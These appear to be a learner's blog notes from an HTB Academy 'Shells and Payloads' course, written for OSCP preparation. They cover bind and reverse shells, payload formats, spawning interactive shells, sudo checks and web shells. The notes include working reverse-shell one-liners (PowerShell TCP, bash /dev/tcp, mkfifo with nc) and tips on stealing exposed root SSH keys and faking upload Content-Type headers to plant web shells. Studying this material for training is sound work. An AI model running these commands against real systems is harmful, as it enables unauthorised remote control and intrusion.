---
layout: single
title:  "HTB Academy - Shells and Payloads"
categories: 
  - OSCP Notes
tags:
  - htb-academy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
permalink: /posts/shells-and-payloads-notes
author_profile: false
sidebar:
  nav: "navbar"
---

searchLinux Shell Validation:

* `ps`
* `env`
* `echo $SHELL`

Windows Shell Validation:

* `env`
* If PowerShell is used, `PS` appears in the prompt. Else, `C:` appears if `cmd` is used.

## Bind Shell

Target has an active listener, and we connect to the target from our attack host.

To create a bind bash shell:
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target ip> 8888 > /tmp/f`

To connect to the bind shell from our attack host:
`nc -nv <target ip> 8888`

## Reverse Shell

Host has an active listener, and we connect to our host from the target.

To create a listener on the host:
`nc -lnvp 8888`

Then, on the target, connect to the host.

* On Windows (`cmd`):
  
  ```
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<host ip>',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```

* On Linux: `bash -i >& /dev/tcp/<host ip>/8888 0>&1` or `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <host ip> 7777 > /tmp/f`

## Windows

Windows payload script formats: `.dll`, `.bat`, `.vbs`, `.msi`, `.ps1`

Useful tools for payload generation: `Metasploit/MSFVenom`, `PayloadsAllTheThings`, `Nishang`

Use `CMD` when:

* You are on an older host that may not include PowerShell.
* When you only require simple interactions/access to the host.
* When you plan to use simple batch files, net commands, or MS-DOS native tools.
* When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:

* You are planning to utilize cmdlets or other custom-built scripts.
* When you wish to interact with .NET objects instead of text output.
* When being stealthy is of lesser concern.
* If you are planning to interact with cloud-based services and hosts.
* If your scripts set and use Aliases.

## Linux

Key things to note:

* What shell & programming languages are available on the system?
* What application is running & are there any known vulnerabilities?
* What distribution of Linux is running, and what packages are available to us?

## Spawning Interactive Shells

### Some commands

* `/bin/sh -i`
* Python: `python -c 'import pty; pty.spawn("/bin/sh")'`

### Linux Permissions

Check file ownership with `ls -la`.

Check `sudo` permissions with `sudo -l` (requires interactive shell).

* If `NOPASSWD` is specified for a certain user, we can `sudo -u <username> <command>`to execute the command as the specified user.
* If we want to login as another user, we can run `su <new username>`.

If we have access to `/root`, check if SSH keys are exposed (private and public keys); downloading these keys to our system allows us to SSH into the server as root (using the private keys `-i`option).

## Web Shells

### Laudanum

The `Laudanum` repository contains shell scripts for web applications in `asp`, `aspx`, `php`, `jsp` etc.

* Location: `/usr/share/laudanum`.
* To use these scripts, modify the required parameters and upload/inject them into the web application.

### Antak webshell

Found within the `Nishang` repository. Useful for `aspx` web applications.

* Like `Laudanum`, we make a copy of the payload script and modify it for our use. Then, we upload it to a vulnerable web application, which should trigger a webshell.

### PHP webshell

WhiteWinterWolf's webshell: <https://github.com/WhiteWinterWolf/wwwolf-php-webshell>

* Likewise, upload the webshell to the website.

Note that some websites only allow specific file types to be uploaded.

* In these cases, we will need to intercept the `POST` requests and modify the `Content-Type` headers for compliance.
* For example, we change the header value from `application/php` to something acceptable, like `image/gif`.
